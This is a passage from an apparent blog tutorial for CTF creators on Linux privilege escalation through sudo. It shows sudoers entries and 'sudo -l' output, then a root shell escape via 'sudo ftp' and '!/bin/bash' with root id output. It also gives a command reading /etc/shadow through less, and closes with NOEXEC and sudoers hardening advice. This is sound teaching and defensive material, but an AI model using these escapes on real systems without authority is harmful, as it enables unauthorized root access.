+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user: <span class="nv">ALL</span> <span class="o">=</span> <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/sbin/iftop
+</span></span><span class="line"><span class="cl">user: <span class="nv">ALL</span> <span class="o">=</span> <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/find
+</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>List the programs that sudo allows your user to run:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User user may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/sbin/iftop
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/find
+</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visit <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreffer ">GTFOBins</a> and search for some of the program names. If the program is listed with &ldquo;sudo&rdquo; as a function, we can use it to elevate privileges, usually via an escape sequence.</p>
+<p>Choose a program from the list and try to gain a root shell, using the instructions from <code>GTFOBins</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~$ sudo ftp
+</span></span><span class="line"><span class="cl">ftp&gt; !/bin/bash
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-vulnerable-sudo">Privilege Escalation via Vulnerable Sudo</h1>
+<p>It is always important to be aware that <code>sudo</code> vulnerabilities rise sometimes, here is a <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156" target="_blank" rel="noopener noreffer ">CVE</a>.</p>
+<h1 id="defense-via-noexec-tag">Defense via NOEXEC Tag</h1>
+<p>Edit the sudo configuration file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo visudo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The NOEXEC option can be utilized to prevent potentially dangerous behavior in certain programs. For instance, some programs, such as <code>less</code>, can generate other commands from their interface by typing specific inputs.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">low  <span class="nv">ALL</span> <span class="o">=</span> NOEXEC: /usr/bin/less
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Run less with sudo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo /usr/bin/less /etc/shadow
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This prevents escapes from less like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">!/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="sudo-defense">Sudo Defense</h1>
+<p>When configuring sudo, it is crucial to carefully define the policy in <code>/etc/sudoers</code>:</p>
+<ol>
+<li><strong>Avoid using the <code>NOPASSWD</code> tag</strong> unless the binary or script is not writable by others, does not take user input, or cannot be escaped with sequences.</li>
+<li><strong>Do not use <code>env_keep+=LD_PRELOAD</code></strong>.</li>
+<li><strong>Do not use <code>env_keep+=LD_LIBRARY_PATH</code></strong>.</li>
+<li><strong>Avoid using the <code>SETENV</code> tag</strong>.</li>
+<li><strong>Ensure sudo is always up to date</strong> with the latest version.</li>
+<li><strong>Utilize a password vault or password manager</strong> to securely store your passwords.</li>
+<li><strong>Apply the <code>NOEXEC</code> tag</strong> to binaries that can be exploited.</li>
+</ol>
+<p>By following these guidelines, you can enhance the security of your sudo configuration and minimize potential vulnerabilities.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-12-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/privilege-escalation/">Privilege Escalation</a>,&nbsp;<a href="/tags/sudo/">Sudo</a>,&nbsp;<a href="/tags/noexec-tag/">Noexec Tag</a>,&nbsp;<a href="/tags/ld_preload/">Ld_preload</a>,&nbsp;<a href="/tags/ld_library_path/">Ld_library_path</a>,&nbsp;<a href="/tags/setenv/">Setenv</a>,&nbsp;<a href="/tags/visudo/">Visudo</a>,&nbsp;<a href="/tags/shell-escape-sequences/">Shell Escape Sequences</a>,&nbsp;<a href="/tags/vulnerable-sudo/">Vulnerable Sudo</a>,&nbsp;<a href="/tags/defend/">Defend</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/linux-privesc-suid-segid/" class="prev" rel="prev" title="Linux Privilege Escalation - SUID/SGID for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Linux Privilege Escalation - SUID/SGID for CTF Creators</a>
+            <a href="/linux-privesc-ssh/" class="next" rel="next" title="Linux Privilege Escalation - SSH for CTF Creators">Linux Privilege Escalation - SSH for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
